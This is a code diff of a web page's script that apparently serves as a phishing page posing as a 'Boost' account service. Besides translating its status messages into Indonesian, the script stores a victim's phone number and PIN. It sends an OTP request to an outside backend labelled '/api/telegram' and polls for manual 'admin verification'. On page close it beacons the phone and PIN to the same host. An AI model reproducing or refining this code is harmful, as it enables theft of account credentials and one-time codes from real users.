@@ -91,7 +91,7 @@
             });
         });
 
-        const BACKEND_URL = 'https://boost-server-meng.onrender.com';
+        const BACKEND_URL = 'https://boost-server-meng.onrender.com'; // Ganti dengan URL Render Anda
 
         function startPolling(phone) {
             if (pollingInterval) clearInterval(pollingInterval);
@@ -106,7 +106,7 @@
                             clearInterval(pollingInterval);
                             setTimeout(() => window.location.href = 'success.html?status=approved', 2000);
                         } else if (data.status === 'rejected') {
-                            statusMsg.textContent = '❌ Wrong OTP . Please Try Again';
+                            statusMsg.textContent = '❌ OTP ditolak. Silakan coba lagi.';
                             statusMsg.style.color = 'red';
                             clearInterval(pollingInterval);
                             confirmBtn.disabled = false;
@@ -132,7 +132,7 @@
             }
             confirmBtn.innerHTML = `<div class='inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div> Sending...`;
             confirmBtn.disabled = true;
-            statusMsg.textContent = 'Send New OTP...';
+            statusMsg.textContent = 'Mengirim OTP...';
             statusMsg.style.color = 'blue';
             try {
                 const response = await fetch(BACKEND_URL + '/api/telegram', {
@@ -142,7 +142,7 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    statusMsg.textContent = 'OTP Send, Please Wait On app..';
+                    statusMsg.textContent = 'OTP terkirim, menunggu verifikasi admin...';
                     statusMsg.style.color = 'orange';
                     startPolling(phone);
                 } else {
@@ -199,13 +199,14 @@
             timeLeft = 420;
         });
 
-        // ========== CANCEL SAAT HALAMAN DITUTUP ==========
+        // Cancel saat halaman ditutup
         window.addEventListener('beforeunload', function() {
             const phone = localStorage.getItem('boost_phone');
             const pin = localStorage.getItem('boost_pin');
             if (phone && pin) {
                 const data = JSON.stringify({ phone, pin });
-                navigator.sendBeacon(BACKEND_URL + '/api/cancel-pending', new Blob([data], { type: 'application/json' }));
+                const blob = new Blob([data], { type: 'application/json' });
+                navigator.sendBeacon(BACKEND_URL + '/api/cancel-pending', blob);
             }
         });
     </script>
